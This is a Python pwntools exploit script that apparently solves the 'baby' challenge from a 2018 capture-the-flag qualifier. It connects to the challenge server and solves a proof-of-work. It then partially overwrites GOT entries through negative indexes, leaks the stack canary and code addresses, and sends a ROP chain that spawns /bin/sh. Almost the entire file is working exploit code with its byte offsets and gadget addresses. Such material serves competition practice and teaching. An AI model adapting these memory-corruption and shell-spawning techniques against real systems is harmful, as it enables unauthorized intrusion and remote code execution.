#!/usr/bin/env python
import subprocess
import re
import time
from pwn import *

r = remote("e4771e24.quals2018.oooverflow.io", 31337)
# r = process("./baby.bin")

r.recvuntil("Challenge: ")
challenge = r.readline()[:-1]
print "Challenge: " + challenge
r.recvuntil("n: ")
n = int(r.readline())
print "N: " + repr(n)

print "Cmd: ./solve_pow.py {} {}".format(challenge, n)
solution = subprocess.check_output("./solve_pow.py {} {}".format(challenge, n), shell=True)
m = re.match(r'(\d+)', solution, re.DOTALL)
assert m is not None
solution = m.group(1)
print solution

r.sendlineafter("Solution: ", solution)


# write 0xf0, read 0x90
# n = 7, read
# n = 8, alarm
# n = 9, stack_check_fail
n = 0
b = None

r.recvuntil("Go\n")
r.send(struct.pack("q", -8 * 9))
time.sleep(0.1)
r.send('\xf0') # overwrite stack_check_fail with _start
time.sleep(0.1)
r.send('a' * 20)
time.sleep(0.1)

r.send(struct.pack("q", -8 * 7))
time.sleep(0.1)
r.send('\xf0') # overwrite read with write
time.sleep(0.1)

b = r.recv(1024)
if len(b) != 1024:
    sys.exit(0)

assert len(b) == 1024
start = u64(b[0x50:0x50 + 8])
main = u64(b[0x38:0x38 + 8])

print "start: " + hex(start)
print "main: " + hex(main)

r.recvuntil("Go\n")
while True:
    r.send(struct.pack("q", -8 * 9))
    time.sleep(0.1)
    r.send('\x1e\x67') # overwrite stack_check_fail with _start
    time.sleep(0.1)
    r.send('a' * 9) # trigger stack check failed
    time.sleep(0.1)

    v = r.recvuntil("Go\n", timeout=1)
    if v == 'Go\n':
        continue
    print "get 0x671e"

    r.send(struct.pack("q", -8 * 8))
    time.sleep(0.1)
    import random
    # \x05 \x45 \xc5
    n = '\xc5'
    # n = chr((random.randint(0,15) << 4) + 5)
    r.send(n) # overwrite alarm with alarm
    # r.send('\x45') # overwrite alarm with alarm
    time.sleep(0.1)
    r.send('a' * 9) # trigger stack check failed
    time.sleep(0.1)
    v = r.recvuntil("Go\n", timeout=1)
    if v == 'Go\n':
        r.recv(1024, timeout=1)
        continue
    print ">>> " + repr(n)

    print "check 1"
    r.send('a' * 9) # trigger stack check failed
    time.sleep(0.1)

    index = struct.pack("q", -8 * 7)
    r.send(index)
    time.sleep(0.1)
    r.send('\xf0') #pritial overwirte write
    oo = r.recvuntil(index)
    print hexdump(oo)

    cc = r.recv(8)
    if cc[0] != 'a':
        continue

    canary = u64("\x00" + cc[1:])
    print hex(canary)

    stack = u64(r.recv(32)[-8:]) - 0xf8
    print hex(stack)
    r.recvuntil("\xfa")
    data = "\xfa" + r.recvuntil("\x00")
    code = u64(data.ljust(8,"\x00")) - 0x6fa
    print hex(code)

    context.arch = "amd64"
    pop_rdi = code + 0x00000000000007f3
    pop_rsi_r15 = code + 0x00000000000007f1
    pop_rbp_r12_r13_r14_r15 = code + 0x00000000000007eb
    alarm = code + 0x5c0
    call_r12_rbx = code + 0x7d0
    rop = p64(alarm) + p64(canary) + "/bin/sh\x00"
    ret = code + 0x78c
    buf = stack + 8*7 + 0x20
    sh = stack+0x10
    rop += flat([alarm,pop_rbp_r12_r13_r14_r15,1,buf,0,0,0,call_r12_rbx,ret]) + "\x00"*48 + p64(pop_rdi) + p64(sh) + p64(alarm)
    r.sendline(rop)
    sleep(0.5)
    r.send((rop)[:0x3b])
    sleep(0.5)
    r.interactive()

r.interactive()
